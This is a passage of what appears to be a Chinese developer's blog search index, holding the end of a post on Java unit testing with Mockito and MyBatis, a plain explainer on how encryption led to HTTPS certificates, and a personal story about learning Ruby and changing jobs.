        <span class="token function">when</span><span class="token punctuation">(</span>postMapper<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenReturn</span><span class="token punctuation">(</span><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">singletonList</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">assertNotNull</span><span class="token punctuation">(</span>postService<span class="token punctuation">.</span><span class="token function">getAllPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testUpdatePost_IfIdIsNullOrNegative_ThrowIllegalArgumentException</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        post<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertThrows</span><span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            postService<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        post<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertThrows</span><span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            postService<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testUpdatePost_IfSuccess_ReturnPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">when</span><span class="token punctuation">(</span>postMapper<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenReturn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Post</span> postRs <span class="token operator">=</span> postService<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">assertNotNull</span><span class="token punctuation">(</span>postRs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>mapper</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">SqlRunner</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSession</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">BeforeAll</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">BeforeEach</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">MybatisTest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">EmbeddedDatabaseConnection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">AutoConfigureTestDatabase</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Rollback</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ActiveProfiles</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ContextConfiguration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">TestPropertySource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>event<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">BeforeTestClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>event<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">BeforeTestMethod</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">Sql</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Transactional</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileNotFoundException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileReader</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">AssertionErrors</span><span class="token punctuation">.</span><span class="token static">assertEquals</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@MybatisTest</span>
<span class="token annotation punctuation">@AutoConfigureTestDatabase</span><span class="token punctuation">(</span>connection <span class="token operator">=</span> <span class="token class-name">EmbeddedDatabaseConnection</span><span class="token punctuation">.</span><span class="token constant">H2</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Sql</span><span class="token punctuation">(</span>scripts <span class="token operator">=</span> <span class="token string">"classpath:schema.sql"</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">PostMapperTest</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token class-name">PostMapper</span> postMapper<span class="token punctuation">;</span>

    <span class="token class-name">Post</span> post<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@BeforeEach</span>
    <span class="token keyword">void</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        post <span class="token operator">=</span> <span class="token class-name">Post</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">content</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testCreate_ReturnAffectOneRow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> i <span class="token operator">=</span> postMapper<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token string">"create post"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testList_ReturnPostList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        postMapper<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Post</span><span class="token punctuation">></span></span> posts <span class="token operator">=</span> postMapper<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token string">"PostMapper#list error"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> posts<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testDelete_ReturnEmptyList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        postMapper<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        postMapper<span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Post</span><span class="token punctuation">></span></span> posts <span class="token operator">=</span> postMapper<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token string">"PostMapper#deleteById error"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> posts<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testUpdate_ReturnUpdated</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        postMapper<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        post<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"second"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        post<span class="token punctuation">.</span><span class="token function">setContent</span><span class="token punctuation">(</span><span class="token string">"Hello World Again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        postMapper<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Post</span><span class="token punctuation">></span></span> posts <span class="token operator">=</span> postMapper<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token string">"PostMapper#update error"</span><span class="token punctuation">,</span> <span class="token string">"second"</span><span class="token punctuation">,</span> posts<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="schema-sql"><a href="#schema-sql" class="headerlink" title="schema.sql"></a>schema.sql</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> POSTS
<span class="token punctuation">(</span>
    id      <span class="token keyword">int</span> <span class="token keyword">comment</span> <span class="token string">'主键'</span><span class="token punctuation">,</span>
    title   <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">comment</span> <span class="token string">'标题'</span><span class="token punctuation">,</span>
    content <span class="token keyword">text</span>         <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">comment</span> <span class="token string">'内容'</span><span class="token punctuation">,</span>
    <span class="token keyword">constraint</span> posts_pk
        <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>编写这些测试用例第一时间感觉最多的是繁琐，而且这些测试用例都很简单，实际中的项目要比这个复杂的多，当补测试用例，会发现完全懵逼。但从测试的角度的来看，容易测试代码必然是高度解耦的代码，不容易测试代码必定是高度耦合的代码。这也就进一步要求我们编写解耦的代码。TDD不是一下子能掌握的，需要长时间的学习和练习。</p>
<p>推荐文章：<a href="https://ruby-china.org/topics/40653">测试驱动开发在项目中的实践</a></p>
]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>加密算法的演化过程</title>
    <url>//post/%E5%AE%89%E5%85%A8/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E6%BC%94%E5%8C%96%E8%BF%87%E7%A8%8B.html</url>
    <content><![CDATA[<h1 id="加密算法的演化过程"><a href="#加密算法的演化过程" class="headerlink" title="加密算法的演化过程"></a>加密算法的演化过程</h1><h2 id="阶段1（明文）："><a href="#阶段1（明文）：" class="headerlink" title="阶段1（明文）："></a>阶段1（明文）：</h2><p><img src="../../typora-user-images/image.png" alt="image"><br>A 和 B在网上聊天，但是双方完全使用明文的方式传输信息，那如果有一天，A问B要游戏账号和密码，B发送了过来，这时候信息一旦被第三个看到，信息直接泄露。</p>
<h2 id="阶段2（对称加密）："><a href="#阶段2（对称加密）：" class="headerlink" title="阶段2（对称加密）："></a>阶段2（对称加密）：</h2><p>A 和 B商量一下，以后咱们说话，先通过一个工具加密一下，比如每个字母往后3位，等你收到了信息，再利用工具，把每个字母往前3位，这样就保证信息即便被人看到了，也不知道说什么<br><img src="../../typora-user-images/image%20(1).png" alt="image (1)"><br>这个也叫<strong>对称加密</strong>，即加密和解密来自于一个秘钥。但这里仍有个问题，这个加密解密方法(秘钥)怎么安全让对方知道，别人都知道咱们是怎么加密解密的了，那即使发送的加密信息也没用啊，除非A跑到B他们家，给出秘钥。但全球范围内的通讯，不能这么搞吧。</p>
<h2 id="阶段3（非对称加密）："><a href="#阶段3（非对称加密）：" class="headerlink" title="阶段3（非对称加密）："></a>阶段3（非对称加密）：</h2><p>A 和 B又发现了新方法，咱俩一人创建一个公钥和私钥，然后交换对方的公钥，这个公钥即使被人看到了也无所谓，当你要给我发消息时，你用我的公钥进行加密，然后发给我，我在我这里用自己的私钥再解密即可，这样私钥只在我一个人手上，就不担心信息泄露了。这也叫做<strong>非对称加密</strong><br><img src="../../typora-user-images/image%20(2).png" alt="image (2)"><br>但是用了一段时间后，A和B都感觉和对称加密比起来，非对称加密太慢了，已经严重影响沟通了啊。</p>
<h2 id="阶段4（加密结合）："><a href="#阶段4（加密结合）：" class="headerlink" title="阶段4（加密结合）："></a>阶段4（加密结合）：</h2><p>使用对称加密时，速度快，但是担心秘钥泄露。<br>使用非对称加密时，速度慢，但是安全。<br>那我们可以把两者结合一下，先使用非对称加密，相互获取公钥，然后生成一个对称加密的秘钥，用非对称加密的公钥加密后传送，这样对方获得了信息后，使用私钥进行解密，就得到了对称加密的秘钥，这样未来就能安全快速的交流了。<br><img src="../../typora-user-images/image%20(3).png" alt="image (3)"><br>一切看起来完美了，但是有一个问题是：在第一次A发送公钥给B时，B怎么知道这个公钥是不是A的，也就是说，假如中间突然出现一个H，拦截了A的公钥，然后把自己公钥发送了B，然后B将对称加密的秘钥发送给了A，但也被H拦截了，这时候H就知道秘钥是什么了，然后再用A的公钥对秘钥加密发送给了A，这时候A也就顺利的获取了秘钥了，但是A和B都没有意识到，中间有一个H操控一切，之后的所有通讯都是暴露的。画图示例：<br><img src="../../typora-user-images/image%20(4).png" alt="image (4)"></p>
<h2 id="阶段5（引入证书）"><a href="#阶段5（引入证书）" class="headerlink" title="阶段5（引入证书）"></a>阶段5（引入证书）</h2><p>为了解决A和B之间传输的证书是否真的来源于彼此，所以引入了受信任的证书颁发机构（CA）签发的数字证书。</p>
<ul>
<li>A找到一家机构，拿上材料，证明我就是我。然后机构给我个证书，这玩意儿包含我的服务器公钥和身份信息和CA机构使用私钥进行的数字签名。</li>
<li>A把证书发给了B，B利用CA的公钥验证这个签名，以确认证书没有被篡改且确实是来自可信的CA。</li>
<li>这时候B就能放心的使用A证书内的公钥，进行之后的交流了。</li>
</ul>
<p>但大家可能会想，如果H拦截了A的证书，然后把自己的证书发送给了B，那这不又完蛋了嘛。<br>所以B在拿好证书时：</p>
<ul>
<li>先检查证书是不是由受信任的CA签发的，否则证书无效。</li>
<li>再检查证书内的IP地址或者域名，是不是A的，否则证书无效。</li>
<li>查询证书是否过期了，否则证书无效</li>
</ul>
<p>再通过一些其他手段不断去检测该证书的有效性，最终双方成功进行加密聊天。<br>其实这个过程也就是HTTPS大致所做的事情，我们将A和B替换为：服务器和浏览器。为了保证交互之间的安全，做了大量的事情，我们有时在访问某些网站时，显示证书已过期之类的，一定要加强重视，不要直接点忽略！！！</p>
]]></content>
      <categories>
        <category>演化过程系列</category>
      </categories>
      <tags>
        <tag>加密,https</tag>
      </tags>
  </entry>
  <entry>
    <title>求上得中，换工作的小故事</title>
    <url>//post/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/%E6%B1%82%E4%B8%8A%E5%BE%97%E4%B8%AD%EF%BC%8C%E6%8D%A2%E5%B7%A5%E4%BD%9C%E7%9A%84%E5%B0%8F%E6%95%85%E4%BA%8B.html</url>
    <content><![CDATA[<h1 id="求上得中，换工作的小故事"><a href="#求上得中，换工作的小故事" class="headerlink" title="求上得中，换工作的小故事"></a>求上得中，换工作的小故事</h1><p>转眼间在程序员这个行业已经工作一年多了，一年前我兴奋的写下：<a href="http://121.37.186.74/post/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/sap.html">勇闯SAP失败，勇敢转行成功</a>，现在结合这一年来发生的故事，想再写点儿有意思的事儿。</p>
<p>去年入职后，我在一家创业团队里负责java后端开发，工作中遇到的问题都感到新奇。每一天都过的充实开心，在业余时间也会经常看看书，比如: 《码农翻身》，《程序员的职业素养》之类的，我发现作者们都提到了一种优雅的编程语言：<code>ruby</code>，相信大部分人可能都不知道这个名字，而市面上主流的培训机构也没有这门语言的身影，从就业情况来看，在Boss直聘上西安使用它的公司仅有三四个。而使用<code>java</code>的公司已是成百上千。好吧，那看来学习它完全是在浪费时间。但能被这么多优秀的作者说起的语言，肯定不是一个无名之辈吧，我尝试着去了解它。</p>
<p>随着了解的越深，我越发现它的有趣性，但由于国内的资料少，便找来国外的资料教程学习，并翻译出来。发布在了<a href="https://ruby-china.org/">RubyChina</a>上(这是我们目前看到的国内最好的语言社区)。而随着这一路的探索，我也发现了很多意料之外的领域和知识。随着我在社区的活跃，也让很多人看到了我的文章。其中一位就是西安一家公司的大佬，邀请我去他们公司看看，并邀请面试。我心里十分激动，但最终也没有过去。那时我才入职半年多，并且总是觉得自己还没准备好，希望准备好了再去。在八月份的时候上海举办了<code>Ruby开发者大会</code>，其中一名演讲者就来自于那位大佬的公司。我想出去涨涨见识，并到时候去现场和这家公司的人了解。于是订下了去上海的飞机票。这是我第一次去上海。我看到了上海的繁华，也看到了许多有趣的公司和演讲题目，更重要的是我看到了认知以外的道路。等到中午参会者就餐时，和邻桌的人员聊了聊，发现是一家上海公司的技术负责人带着同事过来看演讲的，他们也发现了我不是做<code>ruby</code>的，也不是在上海工作，靠着兴趣一个人来的上海，其中技术负责人说如果以后打算来上海，可以把简历发过来看看。好吧，我从没想过来上海工作，但还是很开心，并加其中一人的微信。最终圆满回家。</p>
<p>时间来到了过完年，我信心满满，觉得都准备的差不多时，我投递简历到西安那位大佬公司，想着即使面试不通过，也算是没有遗憾了，但是过了两天，才知道公司今年已经没有岗位招聘了。那一刻我才明白一个道理：<code>好机会不等人</code>，我们总在害怕自己行不行，我们总在担心自己准没准备好，真等准备好了，黄花菜都凉了。想到了爱情公寓里的一句话：</p>
<hr>
<p>有一辆列车在你面前，列车员问：小伙子，你要上车吗？你就问：这车去哪？下一站什么时候到？车上还有座位吗？火车早就开走了，你只能等下一辆。可是下一辆来了，你还是面临同样的问题。等了很久，别人已经到西伯利亚了，你还在车站上。管他呢，上去啊！火车是朝前开的，去哪儿并不重要，关键是窗外的风景！等你下了火车，你就会感谢我的。因为就算有辆飞机停在旁边，你也会二话不说地冲上去的，因为你嫌火车太慢了！</p>
<hr>
<p>这句话有点像鸡汤，但它准确的指出了我们的一大问题，总在担心自己能不能做到。</p>
<p>不过事情并没有到此结束，之前在上海认识的那家公司负责人突然找到我，说目前新增了一个岗位，有一大堆简历不过想到了我。问我想试试吗？于是我成为了这个岗位的第一个面试者，并顺利的通过了面试。过一阵子就去入职了。</p>
<p>回想这一路经历，感觉也挺奇妙的。想去SAP不成功，但真干上了程序员。想去西安这家公司不成功，但遇上到去上海工作的机会。但两者之间都有紧密的联系，于是就有了本文的标题：求上得中。</p>
<hr>
<p>也许很多人会想，做<code>ruby</code>有什么前途啊，工作机会那么一点，等以后不直接失业了，我也想过这个问题，但当我探索这个语言时，我的心态是越发开放的，我不想被绑定一个<code>java程序员</code>的标签，因为那样只会把目光局限于一个地方。这让我看到更多的机会，也许我能做一些更酷的事情。我也知道时间宝贵，如果是<code>浅尝辄止</code>那就是在浪费自己的时间。</p>
]]></content>
      <categories>
        <category>个人经历</category>
      </categories>
  </entry>
</search>
